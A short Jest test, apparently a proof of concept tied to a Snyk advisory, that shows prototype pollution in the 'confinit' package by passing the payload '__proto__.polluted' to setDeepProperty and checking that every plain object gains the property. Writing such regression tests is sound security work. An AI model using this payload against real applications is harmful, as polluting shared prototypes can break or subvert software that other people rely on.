//https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
test("prototype pollution in confinit", () => {
  var root = require("confinit");
  var payload = "__proto__.polluted";

  expect({}.polluted).toBe(undefined);

  root.setDeepProperty({}, payload, "yes");

  expect({}.polluted).toBe("yes");
});
